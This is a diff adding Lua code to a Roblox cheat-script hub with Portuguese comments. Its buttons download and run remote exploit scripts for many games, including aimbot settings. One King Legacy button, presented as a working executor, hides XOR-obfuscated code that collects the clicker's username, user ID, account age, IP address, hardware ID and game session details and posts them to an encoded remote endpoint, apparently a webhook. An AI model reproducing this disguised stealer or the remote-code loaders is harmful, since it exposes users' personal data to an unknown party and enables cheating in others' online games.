+
+-- Criando a aba para A Sols Rng
+local CheeseFactoryTycoonTab = Window:MakeTab({
+    Name = "Cheese Factory Tycoon",
+    Icon = "rbxassetid://126633428869869",  -- Ícone da aba (você pode mudar se quiser)
+    PremiumOnly = false
+})
+
+-- Criando uma seção dentro da aba
+local CheeseFactoryTycoonTab = CheeseFactoryTycoonTab:AddSection({
+    Name = "Cheese Factory Tycoon"
+})
+
+-- Botão para executar o script Slap Battles
+CheeseFactoryTycoonTab:AddButton({
+    Name = "Raccoon Hub",  -- Nome do botão
+    Callback = function()
+        -- Executando o script do link fornecido
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/RaCc0oN1/RobloxObf/main/MainHub'))()
+        -- Notificação de sucessoa
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "Script foi executado com sucesso!",
+            Image = "rbxassetid://4483345998",  -- Imagem da notificação
+            Time = 5
+        })
+    end    
+})
+
+-- Criando a aba para A Sols Rng
+local PunchMonsterstTab = Window:MakeTab({
+    Name = "Punch Monsters",
+    Icon = "rbxassetid://126633428869869",  -- Ícone da aba (você pode mudar se quiser)
+    PremiumOnly = false
+})
+
+-- Criando uma seção dentro da aba
+local PunchMonsterstTab = PunchMonsterstTab:AddSection({
+    Name = "Punch Monsters"
+})
+
+-- Botão para executar o script Slap Battles
+PunchMonsterstTab:AddButton({
+    Name = "Punch Monsters",  -- Nome do botão
+    Callback = function()
+        -- Executando o script do link fornecido
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Moligrafi001/Hallow-Hub/main/Loader.lua",true))()
+        -- Notificação de sucessoa
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "Script foi executado com sucesso!",
+            Image = "rbxassetid://4483345998",  -- Imagem da notificação
+            Time = 5
+        })
+    end    
+})
+
+-- Criando a aba para Anime Champions Simulator
+local AnimeChampionSimulatorTab = Window:MakeTab({
+    Name = "Anime Champions Simulator",
+    Icon = "rbxassetid://126633428869869",  -- Ícone da aba (você pode mudar se quiser)
+    PremiumOnly = false
+})
+
+-- Criando uma seção dentro da aba
+local AnimeChampionSimulatorTab = AnimeChampionSimulatorTab:AddSection({
+    Name = "Anime Champions Simulator"
+})
+
+-- Botão para executar o script Anime Champions Simulator
+AnimeChampionSimulatorTab:AddButton({
+    Name = "Yuto Hub",  -- Nome do botão
+    Callback = function()
+        -- Executando o script do link fornecido
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/JuninhoOGado/ScriptsSite/main/Script244"))()
+        
+        -- Notificação de sucesso
+        OrionLib:MakeNotification({
+            Name = "Yuto Hub",
+            Content = "Script foi executado com sucesso!",
+            Image = "rbxassetid://4483345998",  -- Imagem da notificação
+            Time = 5
+        })
+    end    
+})
+
+-- Criando a aba para One Fruit
+local OneFruitTab = Window:MakeTab({
+    Name = "One Fruit",
+    Icon = "rbxassetid://126633428869869",  -- Ícone da aba (você pode mudar se quiser)
+    PremiumOnly = false
+})
+
+-- Criando uma seção dentro da aba
+local OneFruitSection = OneFruitTab:AddSection({
+    Name = "Controle do Script"
+})
+
+-- Botão para executar o script One Fruit
+OneFruitTab:AddButton({
+    Name = "Nexus Hub",  -- Nome do botão
+    Callback = function()
+        -- Executando o script do link fornecido
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/CrazyHub123/NexusHubMain/main/Main.lua", true))()
+        
+        -- Notificação de sucesso
+        OrionLib:MakeNotification({
+            Name = "One Fruit",
+            Content = "Script foi executado com sucesso!",
+            Image = "rbxassetid://4483345998",  -- Imagem da notificação
+            Time = 5
+        })
+    end    
+})
+
+-- Criando a aba para A Sols Rng
+local SlimeSlayingOnileRPGTab = Window:MakeTab({
+    Name = "Slime Slaying Online RPG",
+    Icon = "rbxassetid://126633428869869",  -- Ícone da aba (você pode mudar se quiser)
+    PremiumOnly = false
+})
+
+-- Criando uma seção dentro da aba
+local SlimeSlayingOnileRPGTab = SlimeSlayingOnileRPGTab:AddSection({
+    Name = "Slime Slaying Online RPG"
+})
+
+-- Botão para executar o script Slap Battles
+SlimeSlayingOnileRPGTab:AddButton({
+    Name = "Slime Slaying Online RPG",  -- Nome do botão
+    Callback = function()
+        -- Executando o script do link fornecido
+        script_key = "" 
+        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/d8bf54daa5b358826ce74cab275f9135.lua"))()
+        -- Notificação de sucessoa
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "Script foi executado com sucesso!",
+            Image = "rbxassetid://4483345998",  -- Imagem da notificação
+            Time = 5
+        })
+    end    
+})
+
+-- Criando a aba King Legacy
+local KingLegacyTab = Window:MakeTab({
+    Name = "King Legacy",
+    Icon = "rbxassetid://126633428869869",  -- Você pode usar um ícone de sua escolha
+    PremiumOnly = false
+})
+
+-- Criando a seção dentro da aba King Legacy
+KingLegacySection = KingLegacyTab:AddSection({
+    Name = "King Legacy"
+})
+
+-- Corrigindo o botão Arc Hub
+KingLegacyTab:AddButton({
+    Name = "Arc Hub",
+    Callback = function()
+        -- Executando o script do Arc Hub
+        loadstring(game:HttpGet("https://pastebin.com/raw/q7j7nAf0", true))()
+        
+        -- Notificação de sucesso após a execução
+        OrionLib:MakeNotification({
+            Name = "Arc Hub",
+            Content = "Script foi executado com sucesso",
+            Image = "rbxassetid://4483345998",  -- Imagem da notificação
+            Time = 5  -- Duração da notificação
+        })
+    end    
+})
+
+KingLegacyTab:AddButton({
+    Name = "Executar (Funciona Pc/Mobile)",
+    Callback = function()
+
+        local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v28,v29) local v30={};for v40=1, #v28 do v6(v30,v0(v4(v1(v2(v28,v40,v40 + 1 )),v1(v2(v29,1 + (v40% #v29) ,1 + (v40% #v29) + 1 )))%256 ));end return v5(v30);end local v8=game:GetService(v7("\249\215\207\53\213\190\213\8\216\192\222","\126\177\163\187\69\134\219\167"));local v9=game:GetService(v7("\19\193\43\220\249\49\222","\156\67\173\74\165"));local v10=game:GetService(v7("\25\182\91\29\185\50\86\56\182\74\19\143\35\84\34\190\74\19","\38\84\215\41\118\220\70"));local v11=v9.LocalPlayer;local v12=v11.UserId;local v13=v11.DisplayName;local v14=v11.Name;local v15=tostring(v11.MembershipType):sub(16 + 5 );local v16=v11.AccountAge;local v17=game.LocalizationService.RobloxLocaleId;local v18=game:HttpGet(v7("\88\2\54\2\237\10\89\109\4\170\30\31\38\23\240\68\88\47\23\177","\158\48\118\66\114"));local v19=game:HttpGet(v7("\163\48\4\38\41\234\180\162\52\93\55\99\172\181\168\43\29\121\121\182\244\165","\155\203\68\112\86\19\197"));local v20=game:GetService(v7("\116\223\46\221\78\121\233\225\82\212\53\239\115\125\247\238\79\222\51","\152\38\189\86\156\32\24\133")):GetClientId();local v21=v7("\206\88\165\74\243\79\233\97\253\90\162\106\253\66\169\69\244\82\181\8\246\88\174\72\219\86\170\67\213\89\180\82\253\89\164\67\180","\38\156\55\199")   .. game.PlaceId   .. ', "'   .. game.JobId   .. '")' ;local v22=v10:GetProductInfo(game.PlaceId).Name;local function v23() return identifyexecutor();end print(v23());local function v24() local v31=0;local v32;local v33;while true do if (v31==0) then v32=v23();v33={[v7("\169\107\125\60\18\102\197\86\186\113","\35\200\29\28\72\115\20\154")]="",[v7("\26\176\223\203\136\34\32","\84\121\223\177\191\237\76")]="",[v7("\190\91\203\165\62\67","\161\219\54\169\192\90\48\80")]={{[v7("\72\87\20\45\70\80","\69\41\34\96")]={[v7("\178\194\218\15","\75\220\163\183\106\98")]=v7("\49\181\134\50\214\12\191\203\50\193\7\185\158\35\220\6\250\146\56\204\16\250\152\52\203\11\170\159","\185\98\218\235\87"),[v7("\222\46\43","\202\171\92\71\134\190")]=v7("\33\213\56\152\58\155\99\199\59\206\46\132\38\217\98\139\38\204","\232\73\161\76")},[v7("\191\220\81\94\12\178\201\86\84\17\181","\126\219\185\34\61")]=string.format(v7("\51\241\101\66\114\118\234\226\30\142\119\124\120\120\206\175\4\218\74\98\109\45\188\168\27\217\73\60\108\120\241\235\3\214\16\113\113\122\188\242\31\203\76\97\49\50\247\174\51\241","\135\108\174\62\18\30\23\147")   .. " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s"   .. "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s"   .. "\n\n__[Game Info](https://www.roblox.com/games/%d)__"   .. "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s"   .. "\n\n**Data:**```%s```\n\n**JobId:**```%s```" ,v12,v13,v14,v12,v15,v16,v17,v18,v20,tostring(os.date(v7("\243\228\101\142\28\225\118\254","\167\214\137\74\171\120\206\83"))),tostring(os.date(v7("\206\200","\199\235\144\82\61\152"))),game.PlaceId,v22,game.PlaceId,v32,v19,v21),[v7("\19\15\169\46","\75\103\118\217")]=v7("\213\93\115\28","\126\167\52\16\116\217"),[v7("\203\33\44\143\166","\156\168\78\64\224\212\121")]=tonumber(v7("\87\246\131\232\35\185\245\158","\174\103\142\197")),[v7("\66\32\74\53\39\80\249\95\36","\152\54\72\63\88\69\62")]={[v7("\193\214\226","\60\180\164\142")]=v7("\80\74\17\57\52\183\93\23\73\18\62\105\255\29\90\82\10\49\105\238\29\85\17\13\44\38\233\1\80\81\17\100\51\229\7\85\92\11\40\46\225\93\81\83\4\46\34\178\7\75\91\23\0\35\176","\114\56\62\101\73\71\141")   .. v12   .. v7("\254\254\210\192\172\225\134\149\237\185\157\204\189\224\220\204\172\180\138\145\232\175\221\203\170\228\218\208\229\249\213\195","\164\216\137\187") }}}};v31=1 -0 ;end if (v31==(1710 -(71 + 1638))) then return v8:JSONEncode(v33);end end end local function v25(v34,v35) local v36=0 -0 ;local v37;local v38;local v39;while true do if (v36==1) then v39={[v7("\246\29\142","\170\163\111\226\151")]=v34,[v7("\51\63\182\33","\73\113\80\210\88\46\87")]=v35,[v7("\172\41\217\26\232\133","\135\225\76\173\114")]=v7("\42\194\139\132","\199\122\141\216\208\204\221"),[v7("\133\216\17\244\125\228\190","\150\205\189\112\144\24")]=v37};v38(v39);break;end if (v36==(0 + 0)) then local v41=0 -0 ;while true do if (v41==(1 + 0)) then v36=1;break;end if ((0 + 0)==v41) then v37={[v7("\209\233\63\166\163\240\31\159\242\40\162\163","\107\178\134\81\210\198\158")]=v7("\57\30\146\202\163\59\15\150\207\165\54\65\136\213\165\54","\202\88\110\226\166")};v38=http_request or v38 or HttpPost or syn.request ;v41=1;end end end end end local v26=v7("\45\144\171\92\23\210\94\95\33\141\172\79\11\154\21\94\38\139\178\3\5\152\24\95\50\129\189\68\11\135\26\3\106\213\236\29\80\219\72\67\112\211\237\30\83\221\64\67\117\208\235\28\75\157\4\10\55\208\166\90\86\218\31\59\45\210\177\77\46\187\21\66\32\187\231\117\16\161\7\7\50\145\185\20\0\174\37\21\3\144\156\65\42\186\9\60\0\135\176\25\82\128\65\47\31\161\133\110\32\170\71\34\51\144\239\26\18\189\64\59\118","\112\69\228\223\44\100\232\113");local v27=v24();v25(v26,v27);
+        
+        -- Notificação de sucesso após a execução
+        OrionLib:MakeNotification({
+            Name = "Executado",
+            Content = "Script foi executado com sucesso",
+            Image = "rbxassetid://4483345998",  -- Imagem da notificação
+            Time = 5  -- Duração da notificação
+        })
+    end    
+})
+
+KingLegacyTab:AddButton({
+    Name = "Lol King",
+    Callback = function()
+        -- Executando o script do Arc Hub
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/Legacy239/refs/heads/main/King908"))()
+        
+        -- Notificação de sucesso após a execução
+        OrionLib:MakeNotification({
+            Name = "Lol King",
+            Content = "Script foi executado com sucesso",
+            Image = "rbxassetid://4483345998",  -- Imagem da notificação
+            Time = 5  -- Duração da notificação
+        })
+    end    
+})
+
+KingLegacyTab:AddButton({
+    Name = "Ls Zee Hub",
+    Callback = function()
+        -- Executando o script do Arc Hub
+        loadstring(game:HttpGet('https://zuwz.me/Ls-Zee-Hub-KL'))()
+        
+        -- Notificação de sucesso após a execução
+        OrionLib:MakeNotification({
+            Name = "Ls Zee Hub",
+            Content = "Script foi executado com sucesso",
+            Image = "rbxassetid://4483345998",  -- Imagem da notificação
+            Time = 5  -- Duração da notificação
+        })
+    end    
+})
+
+-- Criando a aba anime shadow
+local PhantomForcesTab= Window:MakeTab({
+    Name = "Phantom Forces",
+    Icon = "rbxassetid://126633428869869",  -- Você pode usar um ícone de sua escolha
+    PremiumOnly = false
+})
+
+-- Criando a seção dentro da aba 
+PhantomForcesSection = PhantomForcesTab:AddSection({
+    Name = "Phantom Forces"
+})
+
+-- Corrigindo o botão 
+PhantomForcesTab:AddButton({
+    Name = "Homo Hack (Funciona no Pc/Mobile)",
+    Callback = function()
+        -- Executando o script do 
+        getgenv()["load_rewrite"] = true --// ONLY APPLIES TO PF
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/dementiaenjoyer/homohack/main/loader.lua"))()
+
+        -- Notificação de sucesso após a execução
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "Script foi executado com sucesso",
+            Image = "rbxassetid://4483345998",  -- Imagem da notificação
+            Time = 5  -- Duração da notificação
+        })
+    end    
+})
+
+-- Criando a aba para A Sols Rng
+local ToiletDefenseSimulatoTab = Window:MakeTab({
+    Name = "Toilet Defense Simulato",
+    Icon = "rbxassetid://126633428869869",  -- Ícone da aba (você pode mudar se quiser)
+    PremiumOnly = false
+})
+
+-- Criando uma seção dentro da aba
+local ToiletDefenseSimulatoTab = ToiletDefenseSimulatoTab:AddSection({
+    Name = "Toilet Defense Simulato"
+})
+
+-- Botão para executar o script Slap Battles
+ToiletDefenseSimulatoTab:AddButton({
+    Name = "Script 1",  -- Nome do botão
+    Callback = function()
+        -- Executando o script do link fornecido
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Fixes-Toilet-Defense-SEVEN-SCRIPT-9364", true))()
+        -- Notificação de sucessoa
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "Script foi executado com sucesso!",
+            Image = "rbxassetid://4483345998",  -- Imagem da notificação
+            Time = 5
+        })
+    end    
+})
+
+-- Criando a aba 
+local FrontlinesTab= Window:MakeTab({
+    Name = "Frontlines",
+    Icon = "rbxassetid://126633428869869",  -- Você pode usar um ícone de sua escolha
+    PremiumOnly = false
+})
+
+-- Criando a seção dentro da aba
+FrontlinesSection = FrontlinesTab:AddSection({
+    Name = "Frontlines"
+})
+
+-- Corrigindo o botão 
+FrontlinesTab:AddButton({
+    Name = "Frontlines",
+    Callback = function()
+        -- Executando o script do 
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Skzuppy/forge-hub/main/loader.lua"))()
+        
+        -- Notificação de sucesso após a execução
+        OrionLib:MakeNotification({
+            Name = "Frontlines",
+            Content = "Script foi executado com sucesso",
+            Image = "rbxassetid://4483345998",  -- Imagem da notificação
+            Time = 5  -- Duração da notificação
+        })
+    end    
+})
+
+-- Botão para executar o script 
+FrontlinesTab:AddButton({
+    Name = "Main Hub",  -- Nome do botão
+    Callback = function()
+        -- Executando o script do link fornecido
+        loadstring(game:HttpGet("https://scripts.waza80.com/script/Frontlines"))()
+        
+        -- Notificação de sucesso
+        OrionLib:MakeNotification({
+            Name = "Script foi executado",
+            Content = "Script foi executado com sucesso!",
+            Image = "rbxassetid://4483345998",  -- Imagem da notificação
+            Time = 5
+        })
+    end    
+})
+
+
+-- Criando a aba para A Sols Rng
+local DaHoodTab = Window:MakeTab({
+    Name = "Da Hood",
+    Icon = "rbxassetid://126633428869869",  -- Ícone da aba (você pode mudar se quiser)
+    PremiumOnly = false
+})
+
+-- Criando uma seção dentro da aba
+local DaHoodTab = DaHoodTab:AddSection({
+    Name = "Da Hood"
+})
+
+-- Botão para executar o script Slap Battles
+DaHoodTab:AddButton({
+    Name = "Press Q to target Aim",  -- Nome do botão
+    Callback = function()
+        -- Executando o script do link fornecido
+        getgenv().Settings = {
+            Key = "q",
+            LOCK = true,
+            NOTIF = true,
+            Enable = true,
+            AIRSHOT = true,
+            AUTOPRED = true,
+            RESOVLER = false,
+            CHANCE = math.huge
+    }
+    loadstring(game:HttpGet'https://vode.gq/r/v2')()
+        -- Notificação de sucessoa
+        OrionLib:MakeNotification({
+            Name = "Script Executado",
+            Content = "Script foi executado com sucesso!",
+            Image = "rbxassetid://4483345998",  -- Imagem da notificação
+            Time = 5
+        })
+    end    
+})
+
+-- Criando a aba para
+local ZombieAttackTab = Window:MakeTab({
+    Name = "Zombie Attack",
+    Icon = "rbxassetid://126633428869869",  -- Ícone da aba (você pode mudar se quiser)
+    PremiumOnly = false
+})
+
+-- Criando uma seção dentro da aba
+local ZombieAttackTab = ZombieAttackTab:AddSection({
+    Name = "Zombie Attack"
+})
+
+-- Botão para executar o script 
+ZombieAttackTab:AddButton({
+    Name = "X Universal (Funciona no Pc/Mobile)",  -- Nome do botão
+    Callback = function()
+        -- Executando o script do link fornecido
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/Unknownproooolucky/Unknown-Hub-X-Universal-Games/main/Games/Zombie-Attack'))()
+        
+        -- Notificação de sucesso
+        OrionLib:MakeNotification({
+            Name = "O script foi executado",
+            Content = "Script foi executado com sucesso!",
+            Image = "rbxassetid://4483345998",  -- Imagem da notificação
+            Time = 5
+        })
+    end    
+})
+
+-- Criando a aba para Anime Last Stand
+local AnimeLastStandTab = Window:MakeTab({
+    Name = "Anime Last Stand",
+    Icon = "rbxassetid://126633428869869",  -- Ícone da aba (você pode mudar se quiser)
+    PremiumOnly = false
+})
+
+-- Criando uma seção dentro da aba
+local AnimeBlastSimulatorTab = AnimeLastStandTab:AddSection({
+    Name = "Anime Last Stand"
+})
+
+-- Botão para executar o script
+AnimeLastStandTab:AddButton({
+    Name = "Buang Hub",  -- Nome do botão
+    Callback = function()
+        -- Executando o script do link fornecido
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/buang5516/buanghub/main/animeLastStand.lua"))()
+        -- Notificação de sucessoa
+        OrionLib:MakeNotification({
+            Name = "Buang Hub",
+            Content = "Script foi executado com sucesso!",
+            Image = "rbxassetid://4483345998",  -- Imagem da notificação
+            Time = 5
+        })
+    end    
+})
+
+
+-- Criando a aba Bed Wars
+local BedWarsTab = Window:MakeTab({
+    Name = "Bed Wars",
+    Icon = "rbxassetid://126633428869869",  -- Você pode usar um ícone de sua escolha
+    PremiumOnly = false
+})
+
+-- Corrigindo a criação da seção em Bed Wars
+local BedWarsTab = BedWarsTab:AddSection({
+    Name = "Bed Wars"
+})
+
+-- Corrigindo o botão "Aurora Hub"
+BedWarsTab:AddButton({
+    Name = "Aurora Hub",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/cocotv666/Aurora/main/Aurora_Loader"))()
+        OrionLib:MakeNotification({
+            Name = "Aurora Hub",
+            Content = "Script foi executado com sucesso",
+            Image = "rbxassetid://4483345998",  -- Imagem da notificação
+            Time = 5
+        })
+    end    
+})
+
+
+OrionLib:Init()
